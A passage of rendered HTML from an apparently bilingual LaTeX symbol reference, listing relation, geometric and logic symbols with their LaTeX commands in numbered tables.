class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">≫</span></span></span></span></td><td style="text-align:left">\not\gg</td><td style="text-align:center">83</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋡</mo></mrow><annotation encoding="application/x-tex">\nsucceq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm">⋡</span></span></span></span></td><td style="text-align:left">\nsucceq</td></tr><tr><td style="text-align:center">36</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋙</mo></mrow><annotation encoding="application/x-tex">\ggg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⋙</span></span></span></span></td><td style="text-align:left">\ggg</td><td style="text-align:center">84</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪶</mo></mrow><annotation encoding="application/x-tex">\succneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm">⪶</span></span></span></span></td><td style="text-align:left">\succneqq</td></tr><tr><td style="text-align:center">37</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋙̸</mo></mrow><annotation encoding="application/x-tex">\not\ggg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⋙</span></span></span></span></td><td style="text-align:left">\not\ggg</td><td style="text-align:center">85</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≼</mo></mrow><annotation encoding="application/x-tex">\preccurlyeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">≼</span></span></span></span></td><td style="text-align:left">\preccurlyeq</td></tr><tr><td style="text-align:center">38</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋗</mo></mrow><annotation encoding="application/x-tex">\gtrdot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord amsrm">⋗</span></span></span></span></td><td style="text-align:left">\gtrdot</td><td style="text-align:center">86</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋞</mo></mrow><annotation encoding="application/x-tex">\curlyeqprec</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⋞</span></span></span></span></td><td style="text-align:left">\curlyeqprec</td></tr><tr><td style="text-align:center">39</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≤</mo></mrow><annotation encoding="application/x-tex">\le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≤</span></span></span></span></td><td style="text-align:left">\le</td><td style="text-align:center">87</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≽</mo></mrow><annotation encoding="application/x-tex">\succcurlyeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">≽</span></span></span></span></td><td style="text-align:left">\succcurlyeq</td></tr><tr><td style="text-align:center">40</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≤</mo></mrow><annotation encoding="application/x-tex">\leq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≤</span></span></span></span></td><td style="text-align:left">\leq</td><td style="text-align:center">88</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋟</mo></mrow><annotation encoding="application/x-tex">\curlyeqsucc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⋟</span></span></span></span></td><td style="text-align:left">\curlyeqsucc</td></tr><tr><td style="text-align:center">41</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪇</mo></mrow><annotation encoding="application/x-tex">\lneq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel amsrm">⪇</span></span></span></span></td><td style="text-align:left">\lneq</td><td style="text-align:center">89</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≾</mo></mrow><annotation encoding="application/x-tex">\precsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.95916em;vertical-align:-0.22958em;"></span><span class="mrel amsrm">≾</span></span></span></span></td><td style="text-align:left">\precsim</td></tr><tr><td style="text-align:center">42</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≦</mo></mrow><annotation encoding="application/x-tex">\leqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01166em;vertical-align:-0.25583em;"></span><span class="mrel amsrm">≦</span></span></span></span></td><td style="text-align:left">\leqq</td><td style="text-align:center">90</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋨</mo></mrow><annotation encoding="application/x-tex">\precnsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.97333em;vertical-align:-0.23222em;"></span><span class="mrel amsrm">⋨</span></span></span></span></td><td style="text-align:left">\precnsim</td></tr><tr><td style="text-align:center">43</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≰</mo></mrow><annotation encoding="application/x-tex">\nleq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm">≰</span></span></span></span></td><td style="text-align:left">\nleq</td><td style="text-align:center">91</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪷</mo></mrow><annotation encoding="application/x-tex">\precapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0189300000000001em;vertical-align:-0.26167em;"></span><span class="mrel amsrm">⪷</span></span></span></span></td><td style="text-align:left">\precapprox</td></tr><tr><td style="text-align:center">44</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≰</mo></mrow><annotation encoding="application/x-tex">\nleqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.33902em;vertical-align:-0.41951em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\nleqq</td><td style="text-align:center">92</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪹</mo></mrow><annotation encoding="application/x-tex">\precnapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0189300000000001em;vertical-align:-0.26167em;"></span><span class="mrel amsrm">⪹</span></span></span></span></td><td style="text-align:left">\precnapprox</td></tr><tr><td style="text-align:center">45</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≨</mo></mrow><annotation encoding="application/x-tex">\lneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm">≨</span></span></span></span></td><td style="text-align:left">\lneqq</td><td style="text-align:center">93</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≿</mo></mrow><annotation encoding="application/x-tex">\succsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.95916em;vertical-align:-0.22958em;"></span><span class="mrel amsrm">≿</span></span></span></span></td><td style="text-align:left">\succsim</td></tr><tr><td style="text-align:center">46</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≨</mo></mrow><annotation encoding="application/x-tex">\lvertneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\lvertneqq</td><td style="text-align:center">94</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋩</mo></mrow><annotation encoding="application/x-tex">\succnsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.97333em;vertical-align:-0.23222em;"></span><span class="mrel amsrm">⋩</span></span></span></span></td><td style="text-align:left">\succnsim</td></tr><tr><td style="text-align:center">47</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≥</mo></mrow><annotation encoding="application/x-tex">\ge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≥</span></span></span></span></td><td style="text-align:left">\ge</td><td style="text-align:center">95</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪸</mo></mrow><annotation encoding="application/x-tex">\succapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0189300000000001em;vertical-align:-0.26167em;"></span><span class="mrel amsrm">⪸</span></span></span></span></td><td style="text-align:left">\succapprox</td></tr><tr><td style="text-align:center">48</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≥</mo></mrow><annotation encoding="application/x-tex">\geq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">≥</span></span></span></span></td><td style="text-align:left">\geq</td><td style="text-align:center">96</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪺</mo></mrow><annotation encoding="application/x-tex">\succnapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0189300000000001em;vertical-align:-0.26167em;"></span><span class="mrel amsrm">⪺</span></span></span></span></td><td style="text-align:left">\succnapprox</td></tr></tbody></table><h3 id="215-几何符号-geometric-symbols"><a class="markdownIt-Anchor" href="#215-几何符号-geometric-symbols"></a> 2.1.5 几何符号 Geometric symbols</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∥</mo></mrow><annotation encoding="application/x-tex">\parallel</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mrel">∥</span></span></span></span></td><td style="text-align:left">\parallel</td><td style="text-align:center">14</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">◊</mi></mrow><annotation encoding="application/x-tex">\lozenge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80335em;vertical-align:-0.11111em;"></span><span class="mord amsrm">◊</span></span></span></span></td><td style="text-align:left">\lozenge</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∦</mo></mrow><annotation encoding="application/x-tex">\nparallel</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99253em;vertical-align:-0.25142em;"></span><span class="mrel amsrm">∦</span></span></span></span></td><td style="text-align:left">\nparallel</td><td style="text-align:center">15</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⧫</mi></mrow><annotation encoding="application/x-tex">\blacklozenge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80335em;vertical-align:-0.11111em;"></span><span class="mord amsrm">⧫</span></span></span></span></td><td style="text-align:left">\blacklozenge</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∥</mo></mrow><annotation encoding="application/x-tex">\shortparallel</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66334em;vertical-align:-0.08167em;"></span><span class="mrel amsrm">∥</span></span></span></span></td><td style="text-align:left">\shortparallel</td><td style="text-align:center">16</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">★</mi></mrow><annotation encoding="application/x-tex">\bigstar</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mord amsrm">★</span></span></span></span></td><td style="text-align:left">\bigstar</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∦</mo></mrow><annotation encoding="application/x-tex">\nshortparallel</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66334em;vertical-align:-0.08167em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\nshortparallel</td><td style="text-align:center">17</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>◯</mo></mrow><annotation encoding="application/x-tex">\bigcirc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">◯</span></span></span></span></td><td style="text-align:left">\bigcirc</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊥</mo></mrow><annotation encoding="application/x-tex">\perp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mrel">⊥</span></span></span></span></td><td style="text-align:left">\perp</td><td style="text-align:center">18</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">△</mi></mrow><annotation encoding="application/x-tex">\triangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">△</span></span></span></span></td><td style="text-align:left">\triangle</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∠</mi></mrow><annotation encoding="application/x-tex">\angle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mord">∠</span></span></span></span></td><td style="text-align:left">\angle</td><td style="text-align:center">19</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>△</mo></mrow><annotation encoding="application/x-tex">\bigtriangleup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">△</span></span></span></span></td><td style="text-align:left">\bigtriangleup</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∢</mi></mrow><annotation encoding="application/x-tex">\sphericalangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5575600000000001em;vertical-align:-0.03517em;"></span><span class="mord amsrm">∢</span></span></span></span></td><td style="text-align:left">\sphericalangle</td><td style="text-align:center">20</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>▽</mo></mrow><annotation encoding="application/x-tex">\bigtriangledown</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">▽</span></span></span></span></td><td style="text-align:left">\bigtriangledown</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∡</mi></mrow><annotation encoding="application/x-tex">\measuredangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mord amsrm">∡</span></span></span></span></td><td style="text-align:left">\measuredangle</td><td style="text-align:center">21</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>△</mo></mrow><annotation encoding="application/x-tex">\vartriangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mrel amsrm">△</span></span></span></span></td><td style="text-align:left">\vartriangle</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><msup><mn>5</mn><mo>∘</mo></msup></mrow><annotation encoding="application/x-tex">45^\circ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.674115em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.674115em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∘</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">45^\circ</td><td style="text-align:center">22</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">▽</mi></mrow><annotation encoding="application/x-tex">\triangledown</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mord amsrm">▽</span></span></span></span></td><td style="text-align:left">\triangledown</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">□</mi></mrow><annotation encoding="application/x-tex">\Box</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.675em;vertical-align:0em;"></span><span class="mord amsrm">□</span></span></span></span></td><td style="text-align:left">\Box</td><td style="text-align:center">23</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">▲</mi></mrow><annotation encoding="application/x-tex">\blacktriangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mord amsrm">▲</span></span></span></span></td><td style="text-align:left">\blacktriangle</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">■</mi></mrow><annotation encoding="application/x-tex">\blacksquare</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.675em;vertical-align:0em;"></span><span class="mord amsrm">■</span></span></span></span></td><td style="text-align:left">\blacksquare</td><td style="text-align:center">24</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">▼</mi></mrow><annotation encoding="application/x-tex">\blacktriangledown</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mord amsrm">▼</span></span></span></span></td><td style="text-align:left">\blacktriangledown</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋄</mo></mrow><annotation encoding="application/x-tex">\diamond</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord">⋄</span></span></span></span></td><td style="text-align:left">\diamond</td><td style="text-align:center">25</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>◀</mo></mrow><annotation encoding="application/x-tex">\blacktriangleleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">◀</span></span></span></span></td><td style="text-align:left">\blacktriangleleft</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">◊</mi></mrow><annotation encoding="application/x-tex">\Diamond</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80335em;vertical-align:-0.11111em;"></span><span class="mord amsrm">◊</span></span></span></span></td><td style="text-align:left">\Diamond \lozenge</td><td style="text-align:center">26</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>▶</mo></mrow><annotation encoding="application/x-tex">\blacktriangleright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">▶</span></span></span></span></td><td style="text-align:left">\blacktriangleright</td></tr></tbody></table><h3 id="216-逻辑符号-logic-symbols"><a class="markdownIt-Anchor" href="#216-逻辑符号-logic-symbols"></a> 2.1.6 逻辑符号 Logic symbols</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi></mrow><annotation encoding="application/x-tex">\forall</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∀</span></span></span></span></td><td style="text-align:left">\forall</td><td style="text-align:center">20</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">¬</mi></mrow><annotation encoding="application/x-tex">\neg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord">¬</span></span></span></span></td><td style="text-align:left">\neg</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∃</mi></mrow><annotation encoding="application/x-tex">\exists</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∃</span></span></span></span></td><td style="text-align:left">\exists</td><td style="text-align:center">21</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal"≯</mi><mi mathvariant="normal">R</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\not\operatorname{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mop"><span class="mord mathrm">R</span></span></span></span></span></td><td style="text-align:left">\not\operatorname{R}</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∄</mi></mrow><annotation encoding="application/x-tex">\nexists</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord amsrm">∄</span></span></span></span></td><td style="text-align:left">\nexists</td><td style="text-align:center">22</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">⊥</span></span></span></span></td><td style="text-align:left">\bot</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∴</mo></mrow><annotation encoding="application/x-tex">\therefore</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">∴</span></span></span></span></td><td style="text-align:left">\therefore</td><td style="text-align:center">23</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊤</mi></mrow><annotation encoding="application/x-tex">\top</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">⊤</span></span></span></span></td><td style="text-align:left">\top</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∵</mo></mrow><annotation encoding="application/x-tex">\because</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">∵</span></span></span></span></td><td style="text-align:left">\because</td><td style="text-align:center">24</td><td style="text-align:center"><span 